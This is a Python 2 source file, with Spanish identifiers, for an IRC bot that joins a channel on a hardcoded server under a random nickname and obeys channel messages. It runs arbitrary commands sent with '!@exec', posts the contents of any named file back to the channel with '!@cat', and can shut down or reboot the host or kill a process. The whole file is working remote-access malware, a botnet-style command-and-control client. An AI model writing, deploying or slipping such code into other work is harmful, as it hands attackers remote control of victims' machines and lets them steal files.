import socket
import random
from subprocess import Popen, PIPE, CalledProcessError
 
servidor = "192.168.1.30"
canal = "#canal"
nickName = ""
puerto = 6667

def name_generator():
      cad= "abcdefghijklmnopqrstuvwxyz1234567890"
      lenght= random.randint(4,10)
      name=[]
      name+=[cad[random.randint(0,len(cad) - 1)] for i in range(0,lenght)]
      return "".join(name)

def send_msg(irc, canal , msg):
      irc.sendall("PRIVMSG "+ canal +" :"+ msg +"\n\r") 
      
def  get_nick(canal, ircmsg):
      if ircmsg.find("PRIVMSG "+canal) != -1:
            nick = ircmsg.split('!', 1 )
            nick = nick[0].replace(":", "",1)
            return nick
      
def get_msg(canal, ircmsg):
      if ircmsg.find("PRIVMSG "+canal) != -1:
            mensaje = ircmsg.split(canal+' ', 1 )
            mensaje = mensaje[1].replace(":", "",1)
      return mensaje
#Modo Verboso para chat
def v_chat(ircmsg, canal):
      print (get_nick(canal, ircmsg)+": "+get_msg(canal, ircmsg))
      

def do_command(irc, ircmsg):

      if ircmsg.find("PRIVMSG "+canal) != -1:
            v_chat(ircmsg, canal)

      if ircmsg.find("Hola") != -1:
            send_msg(irc, canal, "Hola!!!")

      elif ircmsg.find("!@exec") != -1:
            command_rec = ircmsg.split("!@exec ")[1]
            command_rec = command_rec.split(" ")
            command_rec.append("&")
            sub_stdout, sub_stderr = Popen(command_rec, stdout=PIPE, stdin=PIPE, stderr=PIPE).communicate()
            #send_msg(irc, canal, sub_stdout.replace("\r\n", ", "))
            send_msg(irc, canal, "Hecho!")
      
      elif ircmsg.find("!@cat") != -1:
            command_rec = ircmsg.split("!@cat ")[1]
            sub_stdout, sub_stderr = Popen(["cat", command_rec], stdout=PIPE, stdin=PIPE, stderr=PIPE).communicate()
            send_msg(irc, canal, sub_stdout)

      elif ircmsg.find("!@pwd") != -1:
            sub_stdout, sub_stderr = Popen(["pwd"], stdout=PIPE, stdin=PIPE, stderr=PIPE).communicate()
            send_msg(irc, canal, sub_stdout.replace("\r\n", ""))

      elif ircmsg.find("!@bye") != -1:
            send_msg(irc, canal, "Me voy a dormir zZ")
            #sub_stdout, sub_stderr = Popen(["taskkill", "/IM", "BotIRCMreboo.exe", "/F"], stdout=PIPE, stdin=PIPE, stderr=PIPE).communicate()
            sub_stdout, sub_stderr = Popen(["taskkill", "/IM", "notepad.exe", "/F"], stdout=PIPE, stdin=PIPE, stderr=PIPE).communicate()
      
      elif ircmsg.find("!@shutdown") != -1:
            send_msg(irc, canal, "Adios ;)")
            sub_stdout, sub_stderr = Popen(["shutdown", "/s", "/t", "0"], stdout=PIPE, stdin=PIPE, stderr=PIPE).communicate()

      elif ircmsg.find("!@reboot") != -1 :
            send_msg(irc, "Regreso en un minuto, voy al banio :O")
            sub_stdout, sub_stderr = Popen(["shutdown", "/r", "/t", "0"], stdout=PIPE, stdin=PIPE, stderr=PIPE).communicate()
      


def Scana_main():
      nickName=name_generator()
      irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      irc.connect((servidor, puerto))
      irc.send("USER "+ nickName +" "+ nickName +" "+ nickName +" :r\n\r")
      irc.send("NICK "+ nickName +"\n\r")
      print "Conectando..."
      irc.send("JOIN "+ canal +"\n\r")
      print "Se ha unido al canal " +canal

      while 1:
            ircmsg = irc.recv(512)
            ircmsg = ircmsg.strip('\n\r')
            do_command(irc, ircmsg)


Scana_main()
